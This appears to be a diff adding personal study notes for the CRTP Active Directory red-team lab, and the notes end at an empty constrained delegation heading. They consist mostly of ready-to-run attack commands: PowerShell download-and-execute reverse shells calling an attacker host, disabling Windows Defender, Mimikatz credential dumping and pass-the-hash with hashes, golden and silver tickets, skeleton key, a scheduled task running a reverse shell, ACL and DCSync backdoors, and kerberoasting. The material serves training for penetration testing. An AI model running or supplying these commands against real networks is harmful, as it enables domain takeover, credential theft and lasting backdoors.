@@ -1,0 +1,352 @@
+CRTP Tools Notes
+
+Labs:
+
+In scope machines - 172.16.1.0/24 - 172.16.17.0/24
+
+
+Path:
+
+Domain Enum --> Local Privesc --> Admin Recon --> Lateral Movement --> Domain Admin Privesc --> Cross Trust Attacks --> Persistence.
+
+commands:
+
+Get-Help * (list everything about the help topics)
+Get-Help process (list everything which contains the word process)
+update-help (update the help system v3+)
+Get-help get-item -Full (show full help about the topic)
+Get-help get-item -Examples (show examples on how to run a cmdlet)
+Get-command -commandtype cmdlet (list all the cmdlets)
+
+Import-module <modulepath>
+Get-command -Module <modulename>
+
+
+we can also use .net classes wmi class to do domain enumerations
+
+DOMAIN ENUMERATIONS (Native Code)
+
+$ADCLASS = [System.DirectoryServices.ActiveDirectory.Domain]
+$ADCLASS::GetCurrentDomain()
+
+Tools: Powerview, ActiveDirectory Powershell Module.
+
+Load tools or modules --> . .\powerview.ps1
+
+Powerview Commands:
+
+get-netdomain - shows domain info
+get-domainsid
+get-domainpolicy
+(get-domainpolicy)."result values" - this specific results on the value.
+get-netdomaincontroller
+get-netdomaincontroller -domain domain_name
+get-netuser 
+get-netuser | select cn
+get-netuser -username username
+get-userproperty
+get-userproperty -property pwdlastset
+Find-UserField -SearchField Description -SearchTerm "built"
+get-netcomputer
+get-netcomputer -Fulldata
+get-netcomputer -operatingsystem "*Server 2016*"
+get-netgroup
+Get-NetGroup -GroupName "Domain Admins" -FullData
+GetNetGroup -Domain domain_name
+Get-NetGroupMember -Domain moneycorp.local -GroupName "Enterprise Admins" -FullData
+Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
+get-netloggedon (need admin rights)
+get-netloggedonlocal (locally logged users)
+get-lastloggedon (admin rights)
+invoke-sharefinder -verbose
+invoke-Filefinder -verbose
+get-netfileserver
+
+get-netgpo
+get-netgpogroup (to get list of restricted group)
+Find-GPOComputerAdmin -ComputerName name
+get-netou
+Get-NetOU Studentmachines | %{Get-NetComputer -ADSpath $_}
+
+
+Get-Objects -samAccountname username -ResolveGUIDs
+Invoke-Aclscanner -ResolveGUIDs
+
+Get-netdomaintrust
+Get-netforest
+Get-netforest -domain domain
+Get-netforestdomain -domain domain
+Get-netforesttrust -forest forest
+
+
+DOMAIN ENUMERATION - USER HUNTING
+POWERVIEW:
+Find-Localadminaccess -verbose
+Enter-PSSession -Computername computername (need local admin access to get access on other machine)
+
+Find-WMILocalAdminAccess.ps1 (if SMB and RPC ports are close use this script to check localadmin access)
+
+Invoke-EnumerateLocalAdmin -verbose
+
+Invoke-Userhunter -Verbose
+Invoke-Userhunter -CheckAccess
+
+
+net localgroup administrators
+
+AD Module:
+
+get-addomaincontroller
+get-aduser -Filter * -Properties *
+get-aduser -identity username -Properties *
+Get-ADComputer -Filter * -Properties * | select name,operatingsystem
+
+
+Netcease.ps1 allows us to deny access to logged on sessions which can make the attack hard for the attackers.
+SAMir10 for same purpose but to block the enumeration form the SAMR protocol.
+
+Set-Mppreference -Disablerealtimemonitoring $true (this will disable Windows defender) 
+Set-Mppreference -DisableIOAVProtection $true (Disable download and execute protection)
+
+
+WAYS TO LOCAL PRIV ESC:(One of Way)
+
+C:\windows\panther\unattended.xml
+C:\Syspriv\syspriv.xml
+AutoLogon passwords in Registry.
+Misconfigured Service
+DLL Hijacking and more.
+
+
+PRIVILEGE ESCALATION -LOCAL
+
+Get-WmiObject -Class win32_service | select Pathname (Find Unquoted Service Path)
+
+POWER-UP
+
+Invoke-Allchecks(To run all checks)
+Get-ServiecUnquoted -verbose
+Get-ModifiableserviceFile -verbose
+Get-ModifiableService -Verbose
+
+.\beRoot.exe
+Invoke-Privesc (Look for service we can restart - preferable)
+
+
+
+
+REVERSE SHELL:
+
+powershell.exe iex (iwr -UseBasicParsing http://172.16.100.139/Invoke-PowerShellTcp.ps1)
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.100.139/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.139 -Port 443
+
+BLOOD HOUND
+
+Invoke-BloodHound -CollectionMethod All
+
+To avoid Advance Threat analytics
+
+Invoke-BloodHound -CollectionMethod All -ExcludeDC
+
+LATERAL MOVEMENT
+
+PSRemoting works on 5985 Default port 5986(SSL)
+
+ONE-ONE:
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local (Connects to the machine on which we have local admin rights).
+
+$sess = New-PSSession -ComputerName <machine_name> (saves the session to the variable)
+
+Enter-PSSession -Session $sess (resume Session)
+
+ONE-MANY
+
+Invoke-Command
+
+Invoke-Command -ComputerName <name> -ScriptBlock{whoami;hostname}
+
+Check the Language mode running on the machine.
+
+$ExecutionContext.sessionstate.LanguageMode
+
+Invoke-Command -ComputerName <name> -ScriptBlock ${function:function_name} (Runs the function on our machine on the target system).
+
+Invoke-Command -FilePath C:\AD\Tools\test.ps1 -Session $sess (Loads the test.ps1 on the session from Enter-PSSession)
+
+MIMIKATZ
+
+Invoke-Mimikatz
+
+Invoke-Mimikatz -DumpCreds
+
+Invoke-Mimikatz -Dumpcreds -ComputerName @("sys1","sys2") (needs administrative Privilege)
+
+Get-ApplockerPolicy -Effective | select -ExpandProperty RuleCollections (check applocker rules if Language is restricted)
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe'
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe'
+
+***************PERSISTENCE-GOLDEN TICKET ATTACK******************
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (Execute on DC as Domain ADmin to get the all the hashes from DC --> also KGBTGT hash)
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'  (we can use from any priv to gain access to the domain administrator)
+
+klist (show tickets on the current session)
+klist purge (kills the tickets)
+
+Invoke-mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"' (Silent on Logs- Used to get KBGT Hash with DA priv)
+
+********************************************************************
+
+**************************SILVER TICKET*****************************
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:cifs /rc4:b3ff2de8c5843337c6a8520cde5b475f /startoffset:0 /endin:600 /renewmax:10080 /ptt"' (hash of DCORP-DC) (Gives us access as CIFS)
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:b3ff2de8c5843337c6a8520cde5b475f /startoffset:0 /endin:600 /renewmax:10080 /ptt"' (Host for access as Scheduler and modify Scheduler)
+
+schtasks (View Task Scheduler)
+
+schtasks /s dcorp-dc.dollarcorp.moneycorp.local (views task scheduled on that machine)
+
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck1" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.139/Invoke-PowerShellTcp.ps1''')'"  (create a Task scheduler with the reverse shell payload)
+
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck" (Runs the Scheduler)
+
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:b3ff2de8c5843337c6a8520cde5b475f /startoffset:0 /endin:600 /renewmax:10080 /ptt"' (Host for access as Scheduler and modify Scheduler)
+
+
+**************************SKELETON KEY************************************
+
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local  (This will inject the skeleton key on the lsass -- Need Domain ADmin Priv -- will go if the DC is rebooted)(administrator:mimikatz are the default creds)
+
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcrop\administrator 
+
+
+*************************DSRM (Directory Service Restore Mode)****************
+
+These are set during the set up of the Domain COntroller (account name:administrator)
+
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
+Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -verbose
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:dcorp-dc /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe'
+
+
+******************************CUSTOM SSP (Security Support Provider)***************
+
+Mimilib.dll on the System32 on DC
+
+Invoke-mimikatz -Command '"misc::memssp"'
+
+******************************Persistence using ACL***************
+
+ADMINSDHolder (admin security descriptor holder)
+
+POWERVIEW:
+
+add-objectacl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student139 -Rights All -verbose  (Adds student139 as Domain Admin in AdminSDHolder)
+
+
+Get-ObjectAcl -samAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student139'} (To Check the ACL of the User)
+
+DCSYNC: Adding DCSYnc Priv to User without adding the user to domain admin groups. (This user can execute DCSYNC attack on Domain Admin without having access on it).
+
+Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student139 -Rights DCSync -Verbose   (Add User to the DCSync Rights)
+
+Use this command to invoke DCSYnc to get hashes from DA
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\administrator"'
+
+HOST BASED SECURITY DESCRIPTORS
+
+Security Descriptor Definition Language (SDDL)
+
+Use WMI to get privileges
+
+set-RemoteWMI -username student139 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -verbose (Run this on DA for DC)
+
+Get-wmiobject -Class win32_operatingsystem -computerName dcorp-dc.dollarcorp.moneycorp.local
+
+Use PSRemoting to get Privileges
+
+set-RemotePSRemoting -username student139 -computername dcorp-dc.dollarcorp.moneycorp.local -verbose (Run this on DA for DC)
+
+Invoke-Command -ScriptBlock{hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+DAMP tool to do the same.
+
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student139 -Verbose (From DA)
+
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+
+Get-RemoteLocalAccoutnHash -ComputerName dcorp-dc -Verbose
+
+Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+
+
+****************kerberoast*************************** (One of way to get domain admin via service account)
+
+To Get Service Account that are not created by machine
+
+Powerview:
+Get-Netuser -SPN
+Request-SPNTicket to get the ticket (Loads the ticket to memory)
+
+ADModule:
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+To Request TGS or load into memory
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.kerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local" 
+
+Invoke-mimikatz -Command '"kerberos::list /export"' (Dumps the tickets from memeory)
+
+python,exe .\tgsrepcrack.py .\wordlist.txt .\2-ticket_that_was_exported.kirbi
+
+
+Preauth Disabled.
+
+Powerview_dev:
+Get-DomainUser -preauthnotrequired -verbose
+Invoke-Aclscanner -ResolveGUIDS | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+Powerview:
+Set-DomainObject -Identity Control139User -XOR @{useraccountcontrol=4194304} -Verbose
+
+Get-ASREPHash -username name -Verbose (Gives hash of preauth users and we can crack it offline using john)
+
+SET SPN:
+Get-DomainUSer -Identity support139user | select Serviceprincipalname
+Set-DomainObject -Identity support139user -set @{servicePrincipalname='ops/anything'}
+
+
+************************Delegation Unconstrainted******************************
+
+Powerview:
+
+Get-Netuser -Unconstratined
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe'
+
+FindlocalAdminAccess
+
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' (gets the tickets from the machine)
+
+Invoke-Mimikatz -Command '"kerberos::ptt [0;3e5179]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+
+ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
+
+we can use PSSession to get access to Domain Controller
+
+****************************Delegation Constrainted********************************
+
